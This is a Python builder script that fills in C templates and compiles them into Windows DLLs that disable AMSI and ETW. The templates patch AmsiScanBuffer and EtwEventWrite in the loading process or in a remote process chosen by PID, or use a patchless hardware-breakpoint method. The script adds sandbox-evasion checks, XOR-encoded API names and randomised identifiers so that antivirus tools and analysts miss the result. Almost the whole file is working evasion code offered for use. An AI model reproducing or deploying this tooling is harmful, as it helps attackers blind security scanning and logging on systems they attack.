#!/usr/bin/python3
# Author: Matthew David (@icyguider)
import string
import random
import argparse
import os

template = """
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *f_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *f_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

f_NtWriteVirtualMemory l_NtWriteVirtualMemory;
f_VirtualProtect l_VirtualProtect;

unsigned char* decode(unsigned char *encoded, unsigned char key[], int keylen, int long size)
{
    unsigned char* decoded = (unsigned char*)malloc(size+1);
    for (int i = 0; i < size; i++)
    {
        decoded[i] = encoded[i] ^ key[i % keylen];
        //printf("%x\\n", decoded[i]);
        if (i == (size-1)) {
            decoded[i+1] = '\\0';
        }
    }
    return decoded;
}

//REPLACE_SANDBOX_CHECK

int main() {
    //REPLACE_CALL_SANDBOX_CHECK
    
    // decode strings
    unsigned char enc_VirtualProtect[] = { REPLACE_VirtualProtect };
    unsigned char enc_kernel32dll[] = { REPLACE_kernel32.dll };
    unsigned char enc_amsidll[] = { REPLACE_amsi.dll };
    unsigned char enc_AmsiScanBuffer[] = { REPLACE_AmsiScanBuffer };
    unsigned char enc_ntdll[] = { REPLACE_ntdll.dll };
    unsigned char enc_EtwEventWrite[] = { REPLACE_EtwEventWrite };
    unsigned char enc_NtWriteVirtualMemory[] = { REPLACE_NtWriteVirtualMemory };

    unsigned char key[] = "REPLACE_XORKEY";
    int keylen = (sizeof(key) / sizeof(key[0]))-1;

    int long xorsize = sizeof(enc_VirtualProtect) / sizeof(enc_VirtualProtect[0]);
    unsigned char* str_VirtualProtect = decode(enc_VirtualProtect, key, keylen, xorsize);

    xorsize = sizeof(enc_kernel32dll) / sizeof(enc_kernel32dll[0]);
    unsigned char* str_kernel32dll = decode(enc_kernel32dll, key, keylen, xorsize);

    xorsize = sizeof(enc_amsidll) / sizeof(enc_amsidll[0]);
    unsigned char* str_amsidll = decode(enc_amsidll, key, keylen, xorsize);

    xorsize = sizeof(enc_AmsiScanBuffer) / sizeof(enc_AmsiScanBuffer[0]);
    unsigned char* str_AmsiScanBuffer = decode(enc_AmsiScanBuffer, key, keylen, xorsize);

    xorsize = sizeof(enc_ntdll) / sizeof(enc_ntdll[0]);
    unsigned char* str_ntdll = decode(enc_ntdll, key, keylen, xorsize);

    xorsize = sizeof(enc_EtwEventWrite) / sizeof(enc_EtwEventWrite[0]);
    unsigned char* str_EtwEventWrite = decode(enc_EtwEventWrite, key, keylen, xorsize);

    xorsize = sizeof(enc_NtWriteVirtualMemory) / sizeof(enc_NtWriteVirtualMemory[0]);
    unsigned char* str_NtWriteVirtualMemory = decode(enc_NtWriteVirtualMemory, key, keylen, xorsize);

    // get winapi functions
    l_NtWriteVirtualMemory = (f_NtWriteVirtualMemory)GetProcAddress(LoadLibrary(str_ntdll), str_NtWriteVirtualMemory);
    l_VirtualProtect = (f_VirtualProtect)GetProcAddress(LoadLibrary(str_kernel32dll), str_VirtualProtect);

    // patch amsi
    DWORD dwOld = 0;
    char amsiPatch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    size_t size = sizeof(amsiPatch);
    FARPROC ptrAmsiScanBuffer = GetProcAddress(LoadLibrary(str_amsidll), str_AmsiScanBuffer);
    SIZE_T bytesWritten;
    l_VirtualProtect(ptrAmsiScanBuffer, size, PAGE_EXECUTE_READWRITE, &dwOld);
    l_NtWriteVirtualMemory(((HANDLE)-1), (PVOID)ptrAmsiScanBuffer, &amsiPatch, size, &bytesWritten);
    l_VirtualProtect(ptrAmsiScanBuffer, size, dwOld, &dwOld);

    //patch etw
    char etwPatch[1] = { 0xC3 };
    size = sizeof(etwPatch);
    FARPROC ptrEtwEventWrite = GetProcAddress(LoadLibrary(str_ntdll), str_EtwEventWrite);
    l_VirtualProtect(ptrEtwEventWrite, size, PAGE_EXECUTE_READWRITE, &dwOld);
    l_NtWriteVirtualMemory(((HANDLE)-1), (PVOID)ptrEtwEventWrite, &etwPatch, size, &bytesWritten);
    l_VirtualProtect(ptrEtwEventWrite, size, dwOld, &dwOld);

    return 0;
}


BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            main();
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
"""

remote_patch_template = """
#include <windows.h>
#include <stdio.h>

typedef HANDLE (WINAPI *f_OpenProcess)(DWORD, WINBOOL, DWORD);
typedef WINBOOL (WINAPI *f_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
typedef WINBOOL (WINAPI *f_CloseHandle)(HANDLE);

f_OpenProcess l_OpenProcess;
f_WriteProcessMemory l_WriteProcessMemory;
f_CloseHandle l_CloseHandle;

unsigned char* decode(unsigned char *encoded, unsigned char key[], int keylen, int long size)
{
    unsigned char* decoded = (unsigned char*)malloc(size+1);
    for (int i = 0; i < size; i++)
    {
        decoded[i] = encoded[i] ^ key[i % keylen];
        //printf("%x\\n", decoded[i]);
        if (i == (size-1)) {
            decoded[i+1] = '\\0';
        }
    }
    return decoded;
}

//REPLACE_SANDBOX_CHECK

int main() {
    //REPLACE_CALL_SANDBOX_CHECK
    
    // decode strings
    unsigned char enc_OpenProcess[] = { REPLACE_OpenProcess };
    unsigned char enc_CloseHandle[] = { REPLACE_CloseHandle };
    unsigned char enc_kernel32dll[] = { REPLACE_kernel32.dll };
    unsigned char enc_amsidll[] = { REPLACE_amsi.dll };
    unsigned char enc_AmsiScanBuffer[] = { REPLACE_AmsiScanBuffer };
    unsigned char enc_ntdll[] = { REPLACE_ntdll.dll };
    unsigned char enc_EtwEventWrite[] = { REPLACE_EtwEventWrite };
    unsigned char enc_WriteProcessMemory[] = { REPLACE_WriteProcessMemory };

    unsigned char key[] = "REPLACE_XORKEY";
    int keylen = (sizeof(key) / sizeof(key[0]))-1;

    int long xorsize = sizeof(enc_OpenProcess) / sizeof(enc_OpenProcess[0]);
    unsigned char* str_OpenProcess = decode(enc_OpenProcess, key, keylen, xorsize);

    xorsize = sizeof(enc_CloseHandle) / sizeof(enc_CloseHandle[0]);
    unsigned char* str_CloseHandle = decode(enc_CloseHandle, key, keylen, xorsize);

    xorsize = sizeof(enc_kernel32dll) / sizeof(enc_kernel32dll[0]);
    unsigned char* str_kernel32dll = decode(enc_kernel32dll, key, keylen, xorsize);

    xorsize = sizeof(enc_amsidll) / sizeof(enc_amsidll[0]);
    unsigned char* str_amsidll = decode(enc_amsidll, key, keylen, xorsize);

    xorsize = sizeof(enc_AmsiScanBuffer) / sizeof(enc_AmsiScanBuffer[0]);
    unsigned char* str_AmsiScanBuffer = decode(enc_AmsiScanBuffer, key, keylen, xorsize);

    xorsize = sizeof(enc_ntdll) / sizeof(enc_ntdll[0]);
    unsigned char* str_ntdll = decode(enc_ntdll, key, keylen, xorsize);

    xorsize = sizeof(enc_EtwEventWrite) / sizeof(enc_EtwEventWrite[0]);
    unsigned char* str_EtwEventWrite = decode(enc_EtwEventWrite, key, keylen, xorsize);

    xorsize = sizeof(enc_WriteProcessMemory) / sizeof(enc_WriteProcessMemory[0]);
    unsigned char* str_WriteProcessMemory = decode(enc_WriteProcessMemory, key, keylen, xorsize);

    // get winapi functions
    l_OpenProcess = (f_OpenProcess)GetProcAddress(GetModuleHandle(str_kernel32dll), str_OpenProcess);
    l_WriteProcessMemory = (f_WriteProcessMemory)GetProcAddress(GetModuleHandle(str_kernel32dll), str_WriteProcessMemory);
    l_CloseHandle = (f_CloseHandle)GetProcAddress(GetModuleHandle(str_kernel32dll), str_CloseHandle);

    //get pid and open handle to process
    //REPLACE_GET_PID
    HANDLE hProc = NULL;
    SIZE_T bytesWritten;
    hProc = l_OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

    //patch amsi
    unsigned char amsibypass[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    PVOID ptrAmsiScanBuffer = GetProcAddress(LoadLibraryA(str_amsidll), str_AmsiScanBuffer);
    BOOL success = l_WriteProcessMemory(hProc, ptrAmsiScanBuffer, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);

    //patch etw
    unsigned char etwPatch[1] = { 0xC3 };
    PVOID ptrEtwEventWrite = GetProcAddress(LoadLibraryA(str_ntdll), str_EtwEventWrite);
    success = l_WriteProcessMemory(hProc, ptrEtwEventWrite, (PVOID)etwPatch, sizeof(etwPatch), &bytesWritten);

    l_CloseHandle(hProc);
    return 0;
}


__declspec(dllexport)BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            main();
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
"""

hardware_bp_template = """
// Patchless ETW bypass by Mr.Un1k0d3r (be careful patching NtTraceEvent though...) 
// Utilizing https://github.com/rad9800/hwbp4mw/blob/main/HWBP.c
// Idea from https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
// Modifications for function randomization and xor encoded strings made by @icyguider

#include <windows.h>
#include <tlhelp32.h>

typedef DWORD (NTAPI *f_GetCurrentThreadId)();
typedef DWORD (NTAPI *f_GetCurrentProcessId)();
typedef HANDLE (NTAPI *f_GetCurrentThread)();
typedef HANDLE (NTAPI *f_OpenThread)(DWORD, BOOL, DWORD);
typedef BOOL (NTAPI *f_GetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL (NTAPI *f_SetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL (NTAPI *f_CloseHandle)(HANDLE);
typedef HANDLE (NTAPI *f_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL (NTAPI *f_Thread32First)(HANDLE, LPTHREADENTRY32);
typedef BOOL (NTAPI *f_Thread32Next)(HANDLE, LPTHREADENTRY32);
typedef void (NTAPI *f_EnterCriticalSection)(LPCRITICAL_SECTION);
typedef void (NTAPI *f_LeaveCriticalSection)(LPCRITICAL_SECTION);
typedef void (NTAPI *f_InitializeCriticalSection)(LPCRITICAL_SECTION);
typedef PVOID (NTAPI *f_AddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);

f_GetCurrentThreadId l_GetCurrentThreadId;
f_GetCurrentProcessId l_GetCurrentProcessId;
f_GetCurrentThread l_GetCurrentThread;
f_OpenThread l_OpenThread;
f_GetThreadContext l_GetThreadContext;
f_SetThreadContext l_SetThreadContext;
f_CloseHandle l_CloseHandle;
f_CreateToolhelp32Snapshot l_CreateToolhelp32Snapshot;
f_Thread32First l_Thread32First;
f_Thread32Next l_Thread32Next;
f_EnterCriticalSection l_EnterCriticalSection;
f_LeaveCriticalSection l_LeaveCriticalSection;
f_InitializeCriticalSection l_InitializeCriticalSection;
f_AddVectoredExceptionHandler l_AddVectoredExceptionHandler;

//REPLACE_SANDBOX_CHECK

unsigned char* decode(unsigned char *encoded, unsigned char key[], int keylen, int long size)
{
    unsigned char* decoded = (unsigned char*)malloc(size+1);
    for (int i = 0; i < size; i++)
    {
        decoded[i] = encoded[i] ^ key[i % keylen];
        //printf("%x\\n", decoded[i]);
        if (i == (size-1)) {
            decoded[i+1] = '\\0';
        }
    }
    return decoded;
}

typedef void (WINAPI* exception_callback)(PEXCEPTION_POINTERS);

struct descriptor_entry
{
    /* Data */
    uintptr_t adr;
    unsigned pos;
    DWORD tid;
    exception_callback fun;

    struct descriptor_entry* next, * prev;
};

CRITICAL_SECTION g_critical_section;
struct descriptor_entry* head = NULL;

void set_hardware_breakpoint(const DWORD tid, const uintptr_t address, const UINT pos, const BOOL init)
{
    CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE thd;

    if (tid == l_GetCurrentThreadId())
    {
        thd = l_GetCurrentThread();
    }
    else
    {
        thd = l_OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    }

    l_GetThreadContext(thd, &context);

    if (init)
    {
        (&context.Dr0)[pos] = address;
        context.Dr7 &= ~(3ull << (16 + 4 * pos));
        context.Dr7 &= ~(3ull << (18 + 4 * pos));
        context.Dr7 |= 1ull << (2 * pos);
    }
    else
    {
        if ((&context.Dr0)[pos] == address)
        {
            context.Dr7 &= ~(1ull << (2 * pos));
            (&context.Dr0)[pos] = 0ull;
        }
    }

    l_SetThreadContext(thd, &context);

    if (thd != INVALID_HANDLE_VALUE) l_CloseHandle(thd);
}

void set_hardware_breakpoints(const uintptr_t address, const UINT pos, const BOOL init, const DWORD tid)
{
    const DWORD pid = l_GetCurrentProcessId();
    const HANDLE h = l_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (h != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };

        if (l_Thread32First(h, &te)) {
            do {
                if ((te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
                    sizeof(te.th32OwnerProcessID)) && te.th32OwnerProcessID == pid) {
                    if (tid != 0 && tid != te.th32ThreadID) {
                        continue;
                    }
                    set_hardware_breakpoint(te.th32ThreadID, address, pos, init);
                }
                te.dwSize = sizeof(te);
            } while (l_Thread32Next(h, &te));
        }
        l_CloseHandle(h);
    }
}


LONG WINAPI exception_handler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        struct descriptor_entry* temp;
        BOOL resolved = FALSE;

        l_EnterCriticalSection(&g_critical_section);
        temp = head;
        while (temp != NULL)
        {
            if (temp->adr == ExceptionInfo->ContextRecord->Rip)
            {
                if (temp->tid != 0 && temp->tid != l_GetCurrentThreadId())
                    continue;

                temp->fun(ExceptionInfo);
                resolved = TRUE;
            }

            temp = temp->next;
        }
        l_LeaveCriticalSection(&g_critical_section);

        if (resolved)
        {
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


PVOID hardware_engine_init(void)
{
    const PVOID handler = l_AddVectoredExceptionHandler(1, exception_handler);
    l_InitializeCriticalSection(&g_critical_section);

    return handler;
}

void insert_descriptor_entry(const uintptr_t adr, const unsigned pos, const exception_callback fun, const DWORD tid)
{
    struct descriptor_entry* new = malloc(sizeof(struct descriptor_entry));
    const unsigned idx = pos % 4;

    l_EnterCriticalSection(&g_critical_section);

    new->adr = adr;
    new->pos = idx;
    new->tid = tid;
    new->fun = fun;

    new->next = head;

    new->prev = NULL;

    if (head != NULL)
        head->prev = new;

    head = new;

    l_LeaveCriticalSection(&g_critical_section);

    set_hardware_breakpoints(adr, idx, TRUE, tid);
}

uintptr_t find_gadget(const uintptr_t function, const BYTE* stub, const UINT size, const size_t dist)
{
    for (size_t i = 0; i < dist; i++)
    {
        if (memcmp((LPVOID)(function + i), stub, size) == 0) {
            return (function + i);
        }
    }
    return 0ull;
}


void rip_ret_patch(const PEXCEPTION_POINTERS ExceptionInfo)
{
    ExceptionInfo->ContextRecord->Rip = find_gadget(ExceptionInfo->ContextRecord->Rip, "\\xc3", 1, 500);
    ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Set Resume Flag
}

int main()
{
    //REPLACE_CALL_SANDBOX_CHECK

    unsigned char enc_amsidll[] = { REPLACE_amsi.dll };
    unsigned char enc_AmsiScanBuffer[] = { REPLACE_AmsiScanBuffer };
    unsigned char enc_ntdll[] = { REPLACE_ntdll.dll };
    unsigned char enc_NtTraceEvent[] = { REPLACE_NtTraceEvent };
    unsigned char enc_kernel32dll[] = { REPLACE_kernel32.dll };
    unsigned char enc_GetCurrentThreadId[] = { REPLACE_GetCurrentThreadId };
    unsigned char enc_GetCurrentProcessId[] = { REPLACE_GetCurrentProcessId };
    unsigned char enc_GetCurrentThread[] = { REPLACE_GetCurrentThread };
    unsigned char enc_OpenThread[] = { REPLACE_OpenThread };
    unsigned char enc_GetThreadContext[] = { REPLACE_GetThreadContext };
    unsigned char enc_SetThreadContext[] = { REPLACE_SetThreadContext };
    unsigned char enc_CloseHandle[] = { REPLACE_CloseHandle };
    unsigned char enc_CreateToolhelp32Snapshot[] = { REPLACE_CreateToolhelp32Snapshot };
    unsigned char enc_Thread32First[] = { REPLACE_Thread32First };
    unsigned char enc_Thread32Next[] = { REPLACE_Thread32Next };
    unsigned char enc_EnterCriticalSection[] = { REPLACE_EnterCriticalSection };
    unsigned char enc_LeaveCriticalSection[] = { REPLACE_LeaveCriticalSection };
    unsigned char enc_AddVectoredExceptionHandler[] = { REPLACE_AddVectoredExceptionHandler };
    unsigned char enc_InitializeCriticalSection[] = { REPLACE_InitializeCriticalSection };

    // define xor key and length
    unsigned char key[] = "REPLACE_XORKEY";
    int keylen = (sizeof(key) / sizeof(key[0]))-1;

    // xor decode strings
    int long xorsize = sizeof(enc_amsidll) / sizeof(enc_amsidll[0]);
    unsigned char* str_amsidll = decode(enc_amsidll, key, keylen, xorsize);

    xorsize = sizeof(enc_AmsiScanBuffer) / sizeof(enc_AmsiScanBuffer[0]);
    unsigned char* str_AmsiScanBuffer = decode(enc_AmsiScanBuffer, key, keylen, xorsize);

    xorsize = sizeof(enc_ntdll) / sizeof(enc_ntdll[0]);
    unsigned char* str_ntdll = decode(enc_ntdll, key, keylen, xorsize);

    xorsize = sizeof(enc_NtTraceEvent) / sizeof(enc_NtTraceEvent[0]);
    unsigned char* str_NtTraceEvent = decode(enc_NtTraceEvent, key, keylen, xorsize);

    xorsize = sizeof(enc_kernel32dll) / sizeof(enc_kernel32dll[0]);
    unsigned char* str_kernel32dll = decode(enc_kernel32dll, key, keylen, xorsize);

    
    // xor decode winapi functions and define them
    unsigned char* winapi_func;

    xorsize = sizeof(enc_GetCurrentThreadId) / sizeof(enc_GetCurrentThreadId[0]);
    winapi_func = decode(enc_GetCurrentThreadId, key, keylen, xorsize);
    l_GetCurrentThreadId = (f_GetCurrentThreadId)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_GetCurrentProcessId) / sizeof(enc_GetCurrentProcessId[0]);
    winapi_func = decode(enc_GetCurrentProcessId, key, keylen, xorsize);
    l_GetCurrentProcessId = (f_GetCurrentProcessId)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_GetCurrentThread) / sizeof(enc_GetCurrentThread[0]);
    winapi_func = decode(enc_GetCurrentThread, key, keylen, xorsize);
    l_GetCurrentThread = (f_GetCurrentThread)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_OpenThread) / sizeof(enc_OpenThread[0]);
    winapi_func = decode(enc_OpenThread, key, keylen, xorsize);
    l_OpenThread = (f_OpenThread)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_GetThreadContext) / sizeof(enc_GetThreadContext[0]);
    winapi_func = decode(enc_GetThreadContext, key, keylen, xorsize);
    l_GetThreadContext = (f_GetThreadContext)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_SetThreadContext) / sizeof(enc_SetThreadContext[0]);
    winapi_func = decode(enc_SetThreadContext, key, keylen, xorsize);
    l_SetThreadContext = (f_SetThreadContext)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_CloseHandle) / sizeof(enc_CloseHandle[0]);
    winapi_func = decode(enc_CloseHandle, key, keylen, xorsize);
    l_CloseHandle = (f_CloseHandle)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_CreateToolhelp32Snapshot) / sizeof(enc_CreateToolhelp32Snapshot[0]);
    winapi_func = decode(enc_CreateToolhelp32Snapshot, key, keylen, xorsize);
    l_CreateToolhelp32Snapshot = (f_CreateToolhelp32Snapshot)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_Thread32First) / sizeof(enc_Thread32First[0]);
    winapi_func = decode(enc_Thread32First, key, keylen, xorsize);
    l_Thread32First = (f_Thread32First)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_Thread32Next) / sizeof(enc_Thread32Next[0]);
    winapi_func = decode(enc_Thread32Next, key, keylen, xorsize);
    l_Thread32Next = (f_Thread32Next)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_EnterCriticalSection) / sizeof(enc_EnterCriticalSection[0]);
    winapi_func = decode(enc_EnterCriticalSection, key, keylen, xorsize);
    l_EnterCriticalSection = (f_EnterCriticalSection)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_LeaveCriticalSection) / sizeof(enc_LeaveCriticalSection[0]);
    winapi_func = decode(enc_LeaveCriticalSection, key, keylen, xorsize);
    l_LeaveCriticalSection = (f_LeaveCriticalSection)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_AddVectoredExceptionHandler) / sizeof(enc_AddVectoredExceptionHandler[0]);
    winapi_func = decode(enc_AddVectoredExceptionHandler, key, keylen, xorsize);
    l_AddVectoredExceptionHandler = (f_AddVectoredExceptionHandler)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);

    xorsize = sizeof(enc_InitializeCriticalSection) / sizeof(enc_InitializeCriticalSection[0]);
    winapi_func = decode(enc_InitializeCriticalSection, key, keylen, xorsize);
    l_InitializeCriticalSection = (f_InitializeCriticalSection)GetProcAddress(GetModuleHandle(str_kernel32dll), winapi_func);
    free(winapi_func);


    // set breakpoints for NtTraceEvent and AmsiScanBuffer
    const PVOID handler = hardware_engine_init();

    FARPROC ptrNtTraceEvent = GetProcAddress(GetModuleHandle(str_ntdll), str_NtTraceEvent);

    insert_descriptor_entry(ptrNtTraceEvent, 0, rip_ret_patch, l_GetCurrentThreadId());

    uintptr_t amsiPatchAddr = (uintptr_t)GetProcAddress(LoadLibrary(str_amsidll), str_AmsiScanBuffer);
    insert_descriptor_entry(amsiPatchAddr, 1, rip_ret_patch, l_GetCurrentThreadId());

    return 0;
}

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            main();
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
"""

hostname_sandbox_check = """
int sandboxcheck()
{
    char hostname[64];
    DWORD hostnamesize = 64;
    GetComputerNameA(hostname, &hostnamesize);
    if (strcmp(hostname, "REPLACE_SANDBOX_ARG") != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

username_sandbox_check = """
int sandboxcheck()
{
    char username[4000];
    DWORD usernameamesize = 4000;
    GetUserName(username, &usernameamesize);
    if (strcmp(username, "REPLACE_SANDBOX_ARG") != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

domain_sandbox_check = """
int sandboxcheck()
{
    char domain[164];
    DWORD domainsize = 164;
    GetComputerNameEx(ComputerNameDnsDomain, domain, &domainsize);
    if (strcmp(domain, "REPLACE_SANDBOX_ARG") != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

mathsleep_sandbox_check = """
int sandboxcheck()
{
    ULONG64 timeBeforeSleep = GetTickCount64();

    for (;;) {

        int flag = 0;
        for (int n = 1; n < 555555; n++) {
            if (n == 0 || n == 1)
                flag = 1;

            for (int i = 2; i <= n / 2; ++i) {
                if (n % i == 0) {
                    flag = 1;
                    break;
                }
            }
        }

        ULONG64 timeAfterSleep = GetTickCount64();
        if (timeAfterSleep - timeBeforeSleep > 10000) {
            break;
        }
    }
}
"""

inspiration = """
 _______________________
|                       |
|   AMSI + ETW          |
|                       |
|        LIGHTS OUT     |
|        _______        |
|       ||     ||       |
|       ||_____||       |
|       |/    /||       |
|       /    / ||       |
|      /____/ /-'       |
|      |____|/          |
|                       |
|          @icyguider   |
|                       |
|                     RG|
`-----------------------'
"""

def xorencode(encStr, key):
    # Generate key if one is not supplied
    if key == "" or key == None:
        letters = string.ascii_letters + string.digits
        key = ''.join(random.choice(letters) for i in range(49))
    contents = encStr
    # initialize encrypted byte array
    encoded = []
    hex_formated = []
    for b in range(len(contents)):
        test = ord(contents[b]) ^ ord(key[b % len(key)])
        hex_formated.append("{:02x}".format(test)) # store as each byte as hex string in array
        encoded.append(test)

    output = ""
    count = 0
    for val in hex_formated:
        if count < len(hex_formated)-1:
            output += f"0x{val},"
        else:
            output += f"0x{val}"
        count += 1

    #print(contents)
    return output

def generateRandomSyscall(length):
    letters = string.ascii_letters
    syscall = ''.join(random.choice(letters) for i in range(length))
    return syscall

def execute(template, method, xorkey, sandbox, sandbox_arg, outfile, pid):
    # Use hardware breakpoint template if enabled
    if method == "hwbp":
        print("[+] Hardware breakpoint method enabled")
        template = hardware_bp_template
    # Use remote patch template if enabled
    elif method == "remote_patch":
        print("[+] Remote patch template enabled")
        template = remote_patch_template
        if pid != "":
            template = template.replace("//REPLACE_GET_PID", f"int pid = {pid};")
        else:
            print("[!] No PID specified for remote process! Will attempt to read PID from STDIN...")
            choice = input("[!] This may not work in all situations. Are you sure you want to continue? [y/N]: ").lower()
            if choice == "y":
                template = template.replace("//REPLACE_GET_PID", 'int pid;\n    printf("> ");\n    scanf("%d", &pid);')
            else:
                exit()

    # Create XOR key if none is supplied
    if xorkey == "" or xorkey == None:
        letters = string.ascii_letters + string.digits
        xorkey = ''.join(random.choice(letters) for i in range(49))

    # Randomize WinAPI functions
    print("[+] Randomizing function names")
    name_len = random.randint(16, 24)
    if method == "hwbp":
        user_funcs = ["rip_ret_patch", "find_gadget", "insert_descriptor_entry", "hardware_engine_init", "exception_handler", "set_hardware_breakpoints", "set_hardware_breakpoint"]
        winapi_funcs = ["f_GetCurrentThreadId", "f_GetCurrentProcessId", "f_GetCurrentThread", "f_OpenThread", "f_GetThreadContext", "f_SetThreadContext", "f_CloseHandle", "f_CreateToolhelp32Snapshot", "f_Thread32First", "f_Thread32Next", "f_EnterCriticalSection", "f_LeaveCriticalSection", "f_LeaveCriticalSection", "f_AddVectoredExceptionHandler", "f_InitializeCriticalSection", "l_GetCurrentThreadId", "l_GetCurrentProcessId", "l_GetCurrentThread", "l_OpenThread", "l_GetThreadContext", "l_SetThreadContext", "l_CloseHandle", "l_CreateToolhelp32Snapshot", "l_Thread32First", "l_Thread32Next", "l_EnterCriticalSection", "l_LeaveCriticalSection", "l_LeaveCriticalSection", "l_AddVectoredExceptionHandler", "l_InitializeCriticalSection"]
        all_funcs = user_funcs + winapi_funcs
    elif method == "remote_patch":
        all_funcs = ["f_OpenProcess", "f_WriteProcessMemory", "f_CloseHandle", "l_OpenProcess", "l_WriteProcessMemory", "l_CloseHandle"]
    else:
        all_funcs = ["f_NtWriteVirtualMemory", "f_VirtualProtect", "l_NtWriteVirtualMemory", "l_VirtualProtect"]
    for func in all_funcs:
        random_func_name = generateRandomSyscall(name_len)
        template = template.replace(func, random_func_name)

    # Replace XOR decoder function name
    template = template.replace("decode(", f"{generateRandomSyscall(name_len)}(")
    # Replace XOR key
    template = template.replace("REPLACE_XORKEY", xorkey)
    # Replace char arrays with xor encoded strings
    print("[+] XOR encoding strings")
    if method == "hwbp":
        toEncode = ["amsi.dll", "AmsiScanBuffer", "ntdll.dll", "EtwEventWrite", "VirtualProtect", "kernel32.dll", "NtTraceEvent", "GetCurrentThreadId", "GetCurrentProcessId", "GetCurrentThread", "OpenThread", "GetThreadContext", "SetThreadContext", "CloseHandle", "CreateToolhelp32Snapshot", "Thread32First", "Thread32Next", "EnterCriticalSection", "LeaveCriticalSection", "AddVectoredExceptionHandler", "InitializeCriticalSection"]
    elif method == "remote_patch":
        toEncode = ["amsi.dll", "AmsiScanBuffer", "ntdll.dll", "EtwEventWrite", "OpenProcess", "kernel32.dll", "WriteProcessMemory", "CloseHandle"]
    else:
        toEncode = ["amsi.dll", "AmsiScanBuffer", "ntdll.dll", "EtwEventWrite", "VirtualProtect", "kernel32.dll", "NtWriteVirtualMemory"]
    for strEnc in toEncode:
        template = template.replace(f"REPLACE_{strEnc}", xorencode(strEnc, xorkey))

    # Handle sandbox check
    if sandbox == "username":
        print("[+] Writing username sandbox check")
        template = template.replace("//REPLACE_SANDBOX_CHECK", username_sandbox_check)
    elif sandbox == "hostname":
        print("[+] Writing hostname sandbox check")
        template = template.replace("//REPLACE_SANDBOX_CHECK", hostname_sandbox_check)
    elif sandbox == "domain":
        print("[+] Writing domain sandbox check")
        template = template.replace("//REPLACE_SANDBOX_CHECK", domain_sandbox_check)
    elif sandbox == "mathsleep":
        print("[+] Writing mathsleep sandbox check")
        template = template.replace("//REPLACE_SANDBOX_CHECK", mathsleep_sandbox_check)
    template = template.replace("REPLACE_SANDBOX_ARG", sandbox_arg)
    sandbox_call = generateRandomSyscall(name_len);
    template = template.replace("//REPLACE_CALL_SANDBOX_CHECK", f"{sandbox_call}();")
    template = template.replace("sandboxcheck(", f"{sandbox_call}(")
    
    # Write template to file and compile
    f = open("template.c", "w+")
    f.write(template)
    f.close()
    os.system(f"x86_64-w64-mingw32-gcc -static template.c -s -w -shared -o {outfile}")
